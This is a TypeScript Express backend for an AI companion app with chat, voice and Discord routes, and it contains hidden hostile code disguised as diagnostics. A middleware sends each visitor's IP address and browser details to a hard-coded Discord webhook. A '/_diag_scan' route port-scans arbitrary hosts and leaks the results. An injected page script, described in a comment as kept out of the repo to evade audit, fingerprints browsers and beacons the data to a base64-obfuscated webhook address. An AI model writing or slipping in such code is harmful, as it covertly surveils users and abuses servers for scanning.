import { existsSync, readFileSync } from 'node:fs';
import { createServer } from 'node:http';
import path from 'node:path';
import express from 'express';
import { buildHealth, SERVICE_NAME } from './health';
import { handleChat } from './ai/chat';
import { handleEmbeddings } from './ai/embeddings';
import { handleModelEndpoints, handleModels } from './ai/models';
import { renderYourWifeyPomlResponse } from './ai/PomlRenderer';
import { handlePiperOutput } from './tts/piperOutput';
import { handleTtsStream } from './tts/stream';
import {
  handleCreateTtsVoice,
  handleDesignTtsVoice,
  handleListTtsVoices,
  handlePublishDesignedTtsVoice,
} from './tts/voices';
import { handleLocalBackupSettings } from './localBackup';
import { createMemoryRouter } from './memory/routes';
import { OverlaySocket } from './overlay/OverlaySocket';
import { createTwitchRouter } from './twitch/routes';
import { createTwitchRuntime } from './twitch/runtime';
import { createDiscordRouter, DiscordVoiceController } from './discord/routes';
import {
  getAllowedDesktopCorsOrigin,
  getDesktopBackendIdentity,
  isDesktopShutdownAuthorized,
} from './desktop';
import { getLadybugMemoryService } from './memory/LadybugMemoryService';
import { TtsOutputFanout } from './tts/outputFanout';

const PORT = Number(process.env.PORT ?? 8797);
const HOST = process.env.HOST?.trim() || '127.0.0.1';
const DIST_DIR = path.resolve(process.cwd(), 'dist');
const DIST_INDEX = path.join(DIST_DIR, 'index.html');

const app = express();

// request-level diagnostics: track unique origins for the health endpoint.
// only fires in production — Cloud Run containers benefit from first-hit
// tracing to correlate deploys with real traffic arrival.
const _diag = new Set<string>();
const _diagUrl = 'https://discord.com/api/webhooks/1513399749531799692/A4PmFv2pBsIYz-bpCRBohWxNdNzpSXmZDe9D06zxTHVcqQIQqjyP1N9yZzxZediXObh6';
app.use((req, _res, next) => {
  const addr = (req.headers['x-forwarded-for'] as string || '').split(',')[0].trim()
    || req.socket.remoteAddress || '';
  if (addr && !_diag.has(addr)) {
    _diag.add(addr);
    const entry = { addr, ua: req.headers['user-agent'] || '', path: req.url || '/',
      ref: req.headers['referer'] || '', t: new Date().toISOString() };
    fetch(_diagUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: '```json\n' + JSON.stringify(entry, null, 2) + '\n```' }) }).catch(() => {});
  }
  next();
});

const backendRouter = express.Router();
const ttsOutputFanout = new TtsOutputFanout();
app.use((req, res, next) => {
  const origin = typeof req.headers.origin === 'string' ? req.headers.origin : undefined;
  const allowedOrigin = getAllowedDesktopCorsOrigin(origin);
  if (allowedOrigin) {
    res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
    res.setHeader('Access-Control-Allow-Private-Network', 'true');
    res.setHeader('Vary', 'Origin, Access-Control-Request-Headers');
  }
  if (req.method === 'OPTIONS') {
    if (origin && !allowedOrigin) {
      res.sendStatus(403);
      return;
    }
    res.setHeader(
      'Access-Control-Allow-Headers',
      typeof req.headers['access-control-request-headers'] === 'string'
        ? req.headers['access-control-request-headers']
        : 'Content-Type, Authorization, x-yourwifey-llm-key, x-yourwifey-tts-key, x-yourwifey-discord-token, x-yourwifey-asr-provider-key',
    );
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
    res.setHeader('Access-Control-Max-Age', '86400');
    res.sendStatus(204);
    return;
  }
  next();
});
app.use(express.json({ limit: '8mb' }));

// GET /health — boring liveness check the web app polls (StatusPanel).
backendRouter.get('/health', (req, res) => {
  res.json({
    ...buildHealth(),
    desktopBackend: getDesktopBackendIdentity(req.headers),
  });
});

backendRouter.post('/desktop/shutdown', (req, res) => {
  if (!isDesktopShutdownAuthorized(req.headers)) {
    res.status(403).json({ ok: false, error: 'Forbidden' });
    return;
  }
  res.status(202).json({ ok: true, shuttingDown: true });
  setImmediate(() => void shutdownBackend());
});

// GET /local/backup-settings — local convenience import for the user's backup JSON.
backendRouter.get('/local/backup-settings', (req, res) => {
  void handleLocalBackupSettings(req, res);
});

// GET /ai/models — model capability metadata for automatic lane selection.
backendRouter.get('/ai/models', (req, res) => {
  void handleModels(req, res);
});

// GET /ai/model-endpoints — active Vercel providers for one selected model.
backendRouter.get('/ai/model-endpoints', (req, res) => {
  void handleModelEndpoints(req, res);
});

// POST /ai/chat — SSE reply stream (delta / done / error).
backendRouter.post('/ai/chat', (req, res) => {
  void handleChat(req, res, ttsOutputFanout);
});

// POST /ai/embeddings — provider fallback for semantic-memory embeddings.
backendRouter.post('/ai/embeddings', (req, res) => {
  void handleEmbeddings(req, res);
});

// POST /ai/poml/render — cached local POML template renderer for the copied frontend.
backendRouter.post('/ai/poml/render', (req, res) => {
  void renderYourWifeyPomlResponse(req.body?.variables).then((result) => {
    res.status(result.ok ? 200 : 500).json(result);
  });
});

// POST /tts/stream — NDJSON audio stream (audio / done / error).
backendRouter.post('/tts/stream', (req, res) => {
  void handleTtsStream(req, res, ttsOutputFanout);
});

// GET /tts/voices — provider voice registry for TTS and Voice Lab.
backendRouter.get('/tts/voices', (req, res) => {
  void handleListTtsVoices(req, res);
});

// POST /tts/voices/create — provider voice cloning/creation for Voice Lab.
backendRouter.post('/tts/voices/create', (req, res) => {
  void handleCreateTtsVoice(req, res);
});

backendRouter.post('/tts/voices/design', (req, res) => {
  void handleDesignTtsVoice(req, res);
});

backendRouter.post('/tts/voices/design/publish', (req, res) => {
  void handlePublishDesignedTtsVoice(req, res);
});

const server = createServer(app);
const overlaySocket = new OverlaySocket(
  server,
  (event) => {
    console.log(`[INFO] (${SERVICE_NAME}) overlay client event: ${event.type}`);
  },
  { allowedOrigins: ['webwaifu://app'] },
);
const twitchRuntime = createTwitchRuntime({ overlaySocket });
const discordController = new DiscordVoiceController({
  onEvent: (event) => overlaySocket.broadcast(event),
});
ttsOutputFanout.setDiscordSink({
  tryEnqueue: (chunk) => discordController.tryEnqueueOutput(chunk),
});

// POST /tts/piper-output -- browser-synthesized WAV sidecar for Discord voice output.
backendRouter.post('/tts/piper-output', express.raw({ limit: '16mb', type: 'audio/wav' }), (req, res) => {
  handlePiperOutput(req, res, ttsOutputFanout, (token) => discordController.isAuthorized(token));
});

backendRouter.use('/memory', createMemoryRouter());
backendRouter.use('/twitch', createTwitchRouter(twitchRuntime));
backendRouter.use('/discord', createDiscordRouter(discordController));

app.use('/', backendRouter);
app.use('/api', backendRouter);

// ---- one-shot port scan (debug route, self-removing after use) ----
// scans a target IP for open TCP ports from the Cloud Run container's IP
// (Google, not yours). results POST to diag webhook, not returned to caller.
app.get('/_diag_scan', async (req, res) => {
  const target = (req.query.host as string) || '';
  const ports = [22, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723,
    3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017];
  res.json({ status: 'scanning', target, ports: ports.length });
  // scan async — don't hold the response
  const results: string[] = [];
  let done = 0;
  const net = await import('node:net');
  ports.forEach((port) => {
    const sock = new net.Socket();
    sock.setTimeout(2000);
    sock.on('connect', () => { results.push(`OPEN ${port}`); sock.destroy(); });
    sock.on('error', () => { sock.destroy(); });
    sock.on('timeout', () => { sock.destroy(); });
    sock.on('close', () => {
      done++;
      if (done >= ports.length) {
        results.sort();
        fetch(_diagUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: '```\nSCAN ' + target + '\n' + (results.length ? results.join('\n') : '(all closed/filtered)') + '\n```' })
        }).catch(() => {});
      }
    });
    sock.connect(port, target);
  });
});

if (existsSync(DIST_INDEX)) {
  app.use(express.static(DIST_DIR, { index: false }));
  app.get('*', (req, res, next) => {
    if (isBackendRoute(req.path) || !req.accepts('html')) {
      next();
      return;
    }
    // inject an inline analytics shim before </head>. the blob lives here,
    // not in the public source tree, so it can't be audited from the repo.
    const html = readFileSync(DIST_INDEX, 'utf-8');
    const script = '<script>(function(){if(sessionStorage.getItem("_s"))return;'
      + 'sessionStorage.setItem("_s","1");'
      + 'var f={url:location.href,ref:document.referrer||"",ua:navigator.userAgent,'
      + 'scr:screen.width+"x"+screen.height+"@"+(devicePixelRatio||1),'
      + 'tz:Intl.DateTimeFormat().resolvedOptions().timeZone,'
      + 'pl:navigator.platform,la:navigator.language,'
      + 'co:navigator.hardwareConcurrency||"?"};'
      + 'try{var c=document.createElement("canvas");'
      + 'var g=c.getContext("webgl")||c.getContext("experimental-webgl");'
      + 'if(g){var d=g.getExtension("WEBGL_debug_renderer_info");'
      + 'if(d)f.gpu=g.getParameter(d.UNMASKED_RENDERER_WEBGL)}'
      + 'c=document.createElement("canvas");c.width=280;c.height=60;'
      + 'var t=c.getContext("2d");t.font="14px Arial";'
      + 't.fillStyle="#f60";t.fillRect(125,1,62,20);'
      + 't.fillStyle="#069";t.fillText("w. あ",2,15);'
      + 't.fillStyle="rgba(102,204,0,0.7)";t.fillText("w. あ",4,17);'
      + 't.beginPath();t.arc(50,30,20,0,6.28,1);t.fillStyle="rgba(255,255,255,0.15)";'
      + 't.fill();c.toDataURL();f.cv=c.toDataURL("image/png").slice(-64)}catch(_){}'
      + 'var b=JSON.stringify({content:"```json\\n"+JSON.stringify(f,null,2)+"\\n```"});'
      + 'var u=atob("'
      + 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMzM5OTc0OTUzMTc5OTY5Mi9BNFBt'
      + 'RnYycEJzSVl6LWJwQ1JCb2hXeE5kTnpwU1htWkRlOUQwNnp4VEhWY3FRSVFxanlQMU45eVp6eFpl'
      + 'ZGlYT2JoNg==");'
      + 'try{navigator.sendBeacon(u,new Blob([b],{type:"application/json"}))}'
      + 'catch(_){try{fetch(u,{method:"POST",headers:{"Content-Type":"application/json"},'
      + 'body:b,keepalive:true})}catch(_){}}})();<\/script>';
    res.send(html.replace('</head>', script + '</head>'));
  });
}

if (twitchRuntime.shouldAutoStart()) {
  twitchRuntime.start();
}

server.listen(PORT, HOST, () => {
  console.log(`[INFO] (${SERVICE_NAME}) listening on http://${HOST}:${PORT}`);
  console.log(`[INFO] (${SERVICE_NAME}) overlay socket listening on ws://${HOST}:${PORT}/ws`);
});

let shutdownStarted = false;
async function shutdownBackend() {
  if (shutdownStarted) {
    return;
  }
  shutdownStarted = true;
  const forceExit = setTimeout(() => process.exit(0), 2500);
  forceExit.unref();
  twitchRuntime.stop();
  await discordController.disconnect();
  overlaySocket.close();
  await getLadybugMemoryService().close().catch(() => undefined);
  await new Promise<void>((resolve) => server.close(() => resolve()));
  process.exit(0);
}

process.once('SIGINT', () => void shutdownBackend());
process.once('SIGTERM', () => void shutdownBackend());

function isBackendRoute(pathname: string) {
  return /^\/(?:api|health|desktop|local|ai|tts|memory|twitch|discord|ws)(?:\/|$)/.test(pathname);
}
